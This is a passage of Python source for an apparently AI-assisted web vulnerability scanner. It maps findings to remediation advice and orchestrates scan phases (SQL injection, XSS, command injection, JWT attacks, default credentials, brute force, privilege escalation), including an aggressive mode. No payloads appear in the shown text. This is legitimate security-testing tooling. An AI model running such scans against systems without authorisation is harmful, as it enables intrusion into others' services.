                    "Strict-Transport-Security, Content-Security-Policy, Referrer-Policy. "
                    "Remove information disclosure headers (Server, X-Powered-By)."
                ),
            },
            "input_validation": {
                "title": "Input Validation Remediation",
                "priority": "MEDIUM",
                "description": (
                    "Implement strict server-side input validation for all parameters. "
                    "Validate data types, ranges, and formats. "
                    "Reject negative values for quantities/prices. "
                    "Return generic error messages without stack traces."
                ),
            },
            "path_traversal": {
                "title": "Path Traversal Remediation",
                "priority": "HIGH",
                "description": (
                    "Validate and sanitize all file path inputs. "
                    "Use a whitelist of allowed files/directories. "
                    "Implement chroot or jail mechanisms. "
                    "Never use user input directly in file system operations."
                ),
            },
            "xxe": {
                "title": "XXE Injection Remediation",
                "priority": "CRITICAL",
                "description": (
                    "Disable external entity processing in XML parsers. "
                    "Use JSON instead of XML where possible. "
                    "Configure XML parsers to disallow DTDs and external entities."
                ),
            },
            "ssrf": {
                "title": "SSRF Remediation",
                "priority": "HIGH",
                "description": (
                    "Validate and whitelist allowed URLs and domains. "
                    "Block requests to internal IP ranges (127.0.0.0/8, 10.0.0.0/8, etc.). "
                    "Use a dedicated HTTP client with restricted access. "
                    "Disable unnecessary URL schemes (file://, gopher://, etc.)."
                ),
            },
            "file_upload": {
                "title": "File Upload Security Remediation",
                "priority": "HIGH",
                "description": (
                    "Validate file types using both extension and content (magic bytes). "
                    "Store uploaded files outside the web root. "
                    "Rename uploaded files with random names. "
                    "Set proper Content-Type headers when serving uploads. "
                    "Implement file size limits and antivirus scanning."
                ),
            },
            "session_fixation": {
                "title": "Session Fixation Remediation",
                "priority": "HIGH",
                "description": (
                    "Regenerate session IDs after successful authentication. "
                    "Invalidate old session IDs on login. "
                    "Set secure, httpOnly, and sameSite flags on session cookies."
                ),
            },
            "password_reset": {
                "title": "Password Reset Security",
                "priority": "HIGH",
                "description": (
                    "Validate the Host header server-side. "
                    "Use a whitelist of allowed hosts for password reset links. "
                    "Generate cryptographically secure reset tokens. "
                    "Implement rate limiting on reset requests."
                ),
            },
        }

        for cat in found_categories:
            if cat in recommendation_map:
                recommendations.append(recommendation_map[cat])

        # Sort by priority
        priority_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        recommendations.sort(
            key=lambda x: priority_order.get(x.get("priority", "LOW"), 4)
        )

        return recommendations

    # =================================================================
    # MAIN SCAN ENTRY POINT
    # =================================================================

    async def run_scan(self) -> Dict[str, Any]:
        """
        Main entry point — runs the complete vulnerability scan.

        Execution flow:
        1. Setup (load auth, build targets, capture baselines, detect WAF).
        2. Get ordered categories.
        3. For each category, dispatch to appropriate scanner.
        4. Collect all findings and generate summary.
        5. Save state and return results.

        Returns:
            Dict with complete scan results, findings, statistics.
        """
        logger.info("=" * 70)
        logger.info("VAPT-AI V2.0 — VULNERABILITY SCANNER STARTING")
        logger.info("Target: %s", self.target_url)
        logger.info("Categories: %d", len(self.categories))
        logger.info("AI Analysis: %s", self.use_ai)
        logger.info("Aggressive Mode: %s", self.aggressive)
        logger.info("=" * 70)

        try:
            # Phase 1: Setup
            await self._setup()

            if not self._scan_targets and not any(
                c in self.categories
                for c in [
                    ScanCategory.FORCED_BROWSING,
                    ScanCategory.SECURITY_HEADERS,
                    ScanCategory.DEFAULT_CREDS,
                    ScanCategory.SESSION_FIXATION,
                    ScanCategory.PASSWORD_RESET,
                ]
            ):
                logger.warning("No scan targets available — aborting scan")
                self.state.set_scan_status("completed")
                return {
                    "status": "no_targets",
                    "message": "No endpoints found to scan",
                    "scan_info": {"target": self.target_url},
                }

            # Phase 2: Get ordered categories
            ordered_categories = self._get_ordered_categories()

            logger.info(
                "Scan plan: %s",
                " → ".join(c.value for c in ordered_categories),
            )

            # Phase 3: Execute each category
            all_category_results: Dict[str, List[TestResult]] = {}

            # Determine which categories can run in parallel
            # Injection tests can be parallel; access control must be sequential
            parallel_categories = {
                ScanCategory.SECURITY_HEADERS,
                ScanCategory.FORCED_BROWSING,
                ScanCategory.SQLI,
                ScanCategory.XSS,
                ScanCategory.NOSQL,
                ScanCategory.CMD_INJECTION,
                ScanCategory.INPUT_VALIDATION,
                ScanCategory.PATH_TRAVERSAL,
                ScanCategory.XXE,
                ScanCategory.SSRF,
            }

            sequential_categories = {
                ScanCategory.DEFAULT_CREDS,
                ScanCategory.AUTH_BYPASS,
                ScanCategory.JWT_ATTACK,
                ScanCategory.IDOR,
                ScanCategory.PRIVILEGE_ESCALATION,
                ScanCategory.FILE_UPLOAD,
                ScanCategory.SESSION_FIXATION,
                ScanCategory.PASSWORD_RESET,
                ScanCategory.BRUTE_FORCE,
            }

            # First: run quick sequential categories that feed data
            early_sequential = [
                c for c in ordered_categories
                if c in {
                    ScanCategory.SECURITY_HEADERS,
                    ScanCategory.FORCED_BROWSING,
                    ScanCategory.DEFAULT_CREDS,
                }
            ]

            for category in early_sequential:
                if self._cancelled:
                    break
                cat_results = await self._run_category(category)
                all_category_results[category.value] = cat_results

            # After forced browsing, rebuild targets if new endpoints found
            if ScanCategory.FORCED_BROWSING in early_sequential:
                new_endpoints = self.state.get_all_endpoints()
                if len(new_endpoints) > len(self._scan_targets):
                    logger.info(
                        "Forced browsing discovered new endpoints: %d → %d",
                        len(self._scan_targets), len(new_endpoints),
                    )
                    self._build_scan_targets()
                    await self._capture_baselines()

            # After default creds, reload auth if new credentials found
            if ScanCategory.DEFAULT_CREDS in early_sequential:
                new_creds = self.state.get_all_credentials()
                if new_creds and not self._auth_token:
                    await self._load_auth()

            # Second: run parallel injection categories
            parallel_batch = [
                c for c in ordered_categories
                if c in parallel_categories
                and c not in early_sequential
                and c.value not in all_category_results
            ]

            if parallel_batch and not self._cancelled:
                logger.info(
                    "Running %d injection categories in parallel: %s",
                    len(parallel_batch),
                    ", ".join(c.value for c in parallel_batch),
                )

                parallel_tasks = [
                    self._run_category(cat) for cat in parallel_batch
                ]
                parallel_results = await asyncio.gather(
                    *parallel_tasks, return_exceptions=True,
                )

                for cat, batch_result in zip(parallel_batch, parallel_results):
                    if isinstance(batch_result, list):
                        all_category_results[cat.value] = batch_result
                    elif isinstance(batch_result, Exception):
                        logger.error(
                            "Parallel category %s failed: %s",
                            cat.value, str(batch_result),
                        )
                        all_category_results[cat.value] = []

            # Third: run remaining sequential categories
            remaining_sequential = [
                c for c in ordered_categories
                if c.value not in all_category_results
                and c not in early_sequential
            ]

            for category in remaining_sequential:
                if self._cancelled:
                    break
                cat_results = await self._run_category(category)
                all_category_results[category.value] = cat_results

            # Phase 4: Generate summary
            summary = self._generate_scan_summary()

            # Phase 5: Save state
            self.state.set_scan_status("completed")
            self.state.save_to_disk()

            # Log final summary
            self._log_final_summary(summary)

            summary["status"] = "completed" if not self._cancelled else "cancelled"
            return summary

        except Exception as exc:
            logger.error(
                "SCAN FAILED: %s\n%s",
                str(exc), traceback.format_exc(),
            )
            self.state.set_scan_status("failed")
            self.state.save_to_disk()

            return {
                "status": "failed",
                "error": str(exc),
                "traceback": traceback.format_exc(),
                "partial_summary": self._generate_scan_summary(),
            }

        finally:
            self._running = False

    def _log_final_summary(self, summary: Dict[str, Any]) -> None:
        """Log a formatted final scan summary."""
        stats = summary.get("statistics", {})
        risk = summary.get("risk_score", 0)
        risk_level = summary.get("risk_level", "UNKNOWN")
        by_severity = summary.get("findings_by_severity", {})
        duration = summary.get("scan_info", {}).get("duration_human", "unknown")

        logger.info("=" * 70)
        logger.info("SCAN COMPLETE — FINAL SUMMARY")
        logger.info("=" * 70)
        logger.info("Target:              %s", self.target_url)
        logger.info("Duration:            %s", duration)
        logger.info("Risk Score:          %d/100 (%s)", risk, risk_level)
        logger.info("-" * 40)
        logger.info("Endpoints Scanned:   %d", stats.get("total_endpoints_scanned", 0))
        logger.info("Tests Executed:      %d", stats.get("total_tests_executed", 0))
        logger.info("HTTP Requests:       %d", stats.get("total_requests_sent", 0))
        logger.info("-" * 40)
        logger.info("FINDINGS:")
        logger.info("  Critical:          %d", by_severity.get("critical", 0))
        logger.info("  High:              %d", by_severity.get("high", 0))
        logger.info("  Medium:            %d", by_severity.get("medium", 0))
        logger.info("  Low:               %d", by_severity.get("low", 0))
        logger.info("  Info:              %d", by_severity.get("info", 0))
        logger.info("-" * 40)
        logger.info("Confirmed:           %d", stats.get("confirmed_findings", 0))
        logger.info("Potential:           %d", stats.get("potential_findings", 0))
        logger.info("Errors:              %d", stats.get("errors_encountered", 0))
        logger.info("=" * 70)

        # Log top findings
        top = summary.get("top_findings", [])
        if top:
            logger.info("TOP FINDINGS:")
            for i, finding in enumerate(top[:5], 1):
                logger.info(
                    "  %d. [%s][%s] %s — %s (param: %s)",
                    i,
                    finding.get("severity", "?").upper(),
                    finding.get("confidence", "?"),
                    finding.get("category", "?").upper(),
                    finding.get("request_url", "?"),
                    finding.get("parameter", "?"),
                )
            logger.info("=" * 70)

    # =================================================================
    # CONVENIENCE / EXTERNAL API METHODS
    # =================================================================

    async def scan_single_endpoint(
        self,
        url: str,
        method: str = "GET",
        params: Optional[Dict[str, str]] = None,
        body: Optional[Dict[str, Any]] = None,
        categories: Optional[List[ScanCategory]] = None,
    ) -> Dict[str, Any]:
        """
        Scan a single endpoint (useful for targeted testing).

        Args:
            url:        Endpoint URL.
            method:     HTTP method.
            params:     Query parameters.
            body:       Request body.
            categories: Which categories to test (None = all).

        Returns:
            Dict with findings for this endpoint.
        """
        target = ScanTarget(
            url=url,
            method=method.upper(),
            params=params or {},
            body=body,
        )

        self._scan_targets = [target]

        # Capture baseline
        baseline = await self._capture_single_baseline(target)
        key = f"{target.method}:{target.url}"
        self._baselines[key] = baseline

        # Load auth
        await self._load_auth()

        cats = categories or list(ScanCategory)
        results: List[TestResult] = []

        for category in cats:
            if self._cancelled:
                break
            cat_results = await self._run_category(category)
            results.extend(cat_results)

        return {
            "endpoint": url,
            "method": method,
            "findings": [r.to_dict() for r in results if r.is_vulnerable],
            "total_tests": len(self._all_results),
            "total_findings": sum(1 for r in results if r.is_vulnerable),
        }

    async def quick_scan(self) -> Dict[str, Any]:
        """
        Run a quick scan with only the most important categories.
        Useful for fast initial assessment.
        """
        quick_categories = [
            ScanCategory.SECURITY_HEADERS,
            ScanCategory.FORCED_BROWSING,
            ScanCategory.SQLI,
            ScanCategory.XSS,
            ScanCategory.IDOR,
            ScanCategory.AUTH_BYPASS,
        ]

        original_categories = self.categories
        self.categories = [c for c in quick_categories if c in list(ScanCategory)]
        self.max_payloads = min(self.max_payloads, 10)

        try:
            return await self.run_scan()
        finally:
            self.categories = original_categories

    def get_scan_context_for_orchestrator(self) -> Dict[str, Any]:
        """
        Return scanner state/context for the orchestrator agent.
        Used for decision-making between scan phases.
        """
        return {
            "scanner_running": self._running,
            "progress": self._progress.to_dict(),
            "total_findings": self._progress.total_findings,
            "confirmed_findings": self._progress.confirmed_findings,
            "findings_by_severity": {
                "critical": sum(
                    1 for r in self._findings
                    if r.is_vulnerable
                    and r.severity in (Severity.CRITICAL,)
                ),
                "high": sum(
                    1 for r in self._findings
                    if r.is_vulnerable
                    and r.severity in (Severity.HIGH,)
                ),
            },
            "categories_completed": self._progress.categories_completed,
            "categories_remaining": self._progress.categories_remaining,
            "waf_detected": self._waf_detected,
            "auth_available": bool(self._auth_token or self._auth_cookies),
            "scan_targets_count": len(self._scan_targets),
            "errors": self._progress.errors,
        }
        
        